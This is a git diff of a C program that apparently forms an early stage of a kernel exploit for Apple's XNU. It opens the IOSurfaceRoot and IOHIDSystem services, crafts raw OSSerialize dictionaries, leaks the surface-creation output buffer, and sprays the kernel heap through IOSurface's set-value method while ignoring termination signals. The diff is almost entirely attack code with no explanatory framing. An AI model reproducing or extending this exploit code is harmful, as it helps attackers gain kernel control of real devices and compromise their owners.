@@ -1,9 +1,13 @@
-#include <stdio.h>
-#include <stdlib.h>
+#include <signal.h>             // signal
+#include <stdint.h>             // uint32_t
+#include <stdio.h>              // printf
 #include <mach/mach.h>
-#include <IOSurface/IOSurface.h>
+#include <IOKit/IOKitLib.h>
 
 #define LOG(str, args...) do { printf(str "\n", ##args); } while(0)
+
+const uint64_t IOSURFACE_CREATE_SURFACE_METHOD_INDEX = 0;
+const uint64_t IOSURFACE_SET_VALUE_METHOD_INDEX      = 9;
 
 enum
 {
@@ -25,47 +29,87 @@ enum
     kOSSerializeMagic           = 0x000000d3U,
 };
 
+static void ignore(int signo)
+{
+    /* do nothing */
+}
+
+static uint32_t transpose(uint32_t val)
+{
+    uint32_t ret = 0;
+    for(size_t i = 0; val > 0; i += 8)
+    {
+        ret += (val % 255) << i;
+        val /= 255;
+    }
+    return ret + 0x01010101;
+}
+
 int main(void)
 {
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-    LOG("service: %x", service);
-    io_connect_t client = MACH_PORT_NULL;
-    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &client);
-    LOG("client: %x, %s", client, mach_error_string(ret));
+    kern_return_t ret = 0;
+    int r = 0;
+    task_t self = mach_task_self();
 
-    /*uint32_t size = 0x16000;
-    CFStringRef keys[] = { CFSTR("IOSurfacePreallocPages"), CFSTR("IOSurfacePrefetchPages"), CFSTR("IOSurfaceNonPurgeable"), CFSTR("IOSurfaceAllocSize") };
-    CFTypeRef vals[] = { kCFBooleanTrue, kCFBooleanTrue, kCFBooleanTrue, CFNumberCreate(NULL, kCFNumberIntType, &size) };
-    CFDictionaryRef dict = CFDictionaryCreate(NULL, (const void**)keys, (const void**)vals, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    if(dict == NULL)
-    {
-        LOG("Failed to create dict");
-        return 1;
-    }*/
+    signal(SIGTERM, &ignore);
+    signal(SIGHUP, &ignore);
 
-    uint32_t dict[] =
+    io_service_t hidService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"));
+    LOG("hidService: %x", hidService);
+    if(!MACH_PORT_VALID(hidService)) return -1;
+
+    io_service_t surfaceService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    LOG("IOSurfaceRoot: %x", surfaceService);
+    if(!MACH_PORT_VALID(surfaceService)) return -1;
+
+    io_connect_t surfaceClient = MACH_PORT_NULL;
+    ret = IOServiceOpen(surfaceService, self, 0, &surfaceClient);
+    LOG("IOSurfaceRootUserClient: %x, %s", surfaceClient, mach_error_string(ret));
+    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(surfaceClient)) return -1;
+
+    uint32_t dict_create[] =
     {
         kOSSerializeMagic,
-        kOSSerializeEndCollection | kOSSerializeDictionary | 2,
+        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
 
         kOSSerializeSymbol | 19,
         0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
-        kOSSerializeNumber | 32,
-        0x0,
+        kOSSerializeEndCollection | kOSSerializeNumber | 32,
+        0x1000,
         0x0,
 
         kOSSerializeSymbol | 23,
         0x75534F49, 0x63616672, 0x65725065, 0x63746566, 0x67615068, 0x7365, // "IOSurfacePrefetchPages"
         kOSSerializeEndCollection | kOSSerializeBoolean | 1,
     };
-    char out[0x6c8];
-
-    for(size_t i = 0; i < 10; ++i)
+    uint32_t out[0x1b2];
+    size_t outsize = sizeof(out);
+    ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_CREATE_SURFACE_METHOD_INDEX, dict_create, sizeof(dict_create), out, &outsize);
+    LOG("newSurface: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS) return -1;
+    for(size_t i = 0; i < 0x1b2; ++i)
     {
-        size_t outsize = sizeof(out);
-        ret = IOConnectCallStructMethod(client, 0, dict, sizeof(dict), out, &outsize);
-        LOG("newSurface: %s", mach_error_string(ret));
+        LOG("%08x", out[i]);
     }
+
+    uint32_t dict_spray[0xc07] =
+    {
+        // Some weird header
+        0x0,
+        0x0,
+
+        kOSSerializeMagic,
+        kOSSerializeEndCollection | kOSSerializeArray | 2,
+
+        kOSSerializeData | 0x3000,
+    };
+    dict_spray[0xc05] = kOSSerializeEndCollection | kOSSerializeString | 4;
+    dict_spray[0xc06] = transpose(0);
+    uint32_t value;
+    outsize = sizeof(value);
+    ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE_METHOD_INDEX, dict_spray, sizeof(dict_spray), &value, &outsize);
+    LOG("setValue: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS) return -1;
 
     /*for(size_t i = 0; i < 1000; ++i)
     {
@@ -75,7 +119,7 @@ int main(void)
     }*/
 
     LOG("Done");
-    sleep(1000);
+    //sleep(1000);
 
     return 0;
 }
